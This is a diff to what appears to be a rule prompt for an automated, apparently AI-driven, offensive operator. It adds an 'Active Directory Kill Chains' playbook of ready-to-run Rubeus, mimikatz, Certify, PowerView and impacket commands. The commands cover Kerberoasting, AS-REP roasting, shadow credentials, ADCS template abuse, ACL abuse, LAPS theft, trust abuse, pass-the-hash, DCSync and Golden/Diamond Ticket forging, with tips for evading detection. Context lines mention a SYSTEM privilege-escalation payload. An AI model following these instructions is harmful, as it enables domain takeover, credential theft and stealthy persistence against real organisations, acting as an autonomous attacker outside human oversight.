@@ -50,6 +50,68 @@ Rules:
     payload as phoneinfo.dll → WER\\QueueReporting COM task → SYSTEM. 100% rate, no prerequisites.
     Pre-check: phoneinfo.dll must not exist in System32. Run no args: `ShieldBreak`."
     For Win10/Win11 (not 25H2) with WD → prefer RoguePlanet instead.
+
+## Active Directory Kill Chains
+
+13. Kerberoasting path: if Rubeus triage/klist shows service accounts with SPNs:
+    → `Rubeus kerberoast /outfile:hashes.txt /nowrap` (or /rc4opsec to filter AES-only)
+    → hashcat -m 13100 hashes.txt wordlist — if cracked:
+    → `Rubeus asktgt /user:<svc> /password:<pass> /ptt` then lateral movement to SPN host
+    → If account has DCSync rights: `mimikatz lsadump::dcsync /user:krbtgt`
+    OpSec: kerberoast /rc4opsec filters out AES-only accounts (harder to crack but less noise).
+
+14. AS-REP Roasting: if `net user /domain` or ADSearch shows accounts, check for no-preauth:
+    → `Rubeus asreproast /format:hashcat /outfile:asrep.txt`
+    → hashcat -m 18200 asrep.txt wordlist
+    → If cracked: `Rubeus asktgt /user:<user> /password:<pass> /ptt`
+    Indicator: accounts with DONT_REQ_PREAUTH flag set. Surface immediately if any found.
+
+15. Shadow Credentials: if Whisker list shows msDS-KeyCredentialLink writable OR GenericAll/WriteMSDS-KeyCredentialLink on account:
+    → `Whisker add /target:<user>` — generates certificate + password
+    → `Rubeus asktgt /user:<user> /certificate:<b64> /password:<pass> /ptt`
+    → `Rubeus s4u /self /impersonateuser:Administrator /altservice:cifs/<target>` if machine account
+    → DC: `mimikatz lsadump::dcsync /user:krbtgt` after DA ticket
+
+16. ADCS abuse (Certify):
+    → `Certify find /vulnerable` — check for ESC1-8 templates
+    → ESC1 (enrollee supplies SAN): `Certify request /ca:<CA> /template:<tpl> /altname:administrator`
+       then `Rubeus asktgt /user:administrator /certificate:<pem> /ptt`
+    → ESC4 (template write permission): modify template → ESC1 path
+    → ESC8 (HTTP enrollment endpoint): `ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs`
+    Always check: `Certify find /vulnerable /hideAdmins` for non-obvious templates.
+
+17. ACL abuse: if BloodHound or ADSearch shows ACEs:
+    → GenericAll/GenericWrite on user: `net user <target> <newpass> /domain` or Whisker shadow cred
+    → GenericAll on group: `net group "<group>" <ouruser> /add /domain`
+    → WriteDACL on domain object: `Add-DomainObjectAcl -TargetIdentity "<domain>" -Rights DCSync` (PowerView)
+       then `mimikatz lsadump::dcsync /domain:<dom> /user:krbtgt`
+    → ForceChangePassword: `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
+    → Owned computer with LAPS write: read AdmPwd → local admin → dump SAM
+
+18. LAPS: if ms-Mcs-AdmPwd attribute is readable:
+    → `ADSearch --search "(ms-Mcs-AdmPwd=*)" --attributes ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd,cn`
+    → Use recovered local admin creds for lateral movement: `net use \\\\<host>\\C$ /user:<host>\\Administrator <pass>`
+    → Prioritize hosts near DCs or with LAPS password recently changed (means active admin access)
+
+19. Domain Trusts: if nltest /domain_trusts shows external or forest trusts:
+    → Bidirectional trust: enumerate the trusted domain with `ADSearch --domain <trusted.domain> --search "objectClass=user"`
+    → SID History abuse: check if migration artifacts left SIDHistory on accounts (`ADSearch --search "(sidHistory=*)"`)
+    → Forest trust with SID filtering disabled: inject DA SID of trusted forest into TGT
+    → Unconstrained delegation + trust: coerce DC auth via SpoolSS/PetitPotam → catch TGT → DCSync
+
+20. Credential use priority chain (when creds are in hand):
+    → Cleartext password: try `Rubeus asktgt` (Kerberos) before PTH — Kerberos ticket lasts 10h
+    → NT hash (no cleartext): PTH via `impacket psexec.py` or `Rubeus s4u` for Kerberos
+    → TGT (ccache/kirbi): `Rubeus ptt` → operate from that context
+    → TGS: use directly for target service, or convert: `Rubeus describe /ticket:<b64>`
+    → AES256 key: `Rubeus asktgt /user:<u> /aes256:<key> /opsec /ptt` — quieter than NTLM PTH
+
+21. DCSync → Golden Ticket (endgame):
+    → DCSync requires: DA, Domain Controller computer account, or explicit DCSync ACE (GetChangesAll)
+    → `mimikatz lsadump::dcsync /domain:<dom> /all /csv` — dump all hashes
+    → Golden Ticket: `mimikatz kerberos::golden /user:Administrator /domain:<dom> /sid:<domain-sid> /krbtgt:<hash> /ptt`
+    → Golden Ticket persists even after krbtgt password change (if only rotated once — rotate twice to invalidate)
+    → Diamond Ticket (stealthier): `Rubeus diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512` — forges within real TGT request, avoids MS ticket anomaly detection
 """
 
 
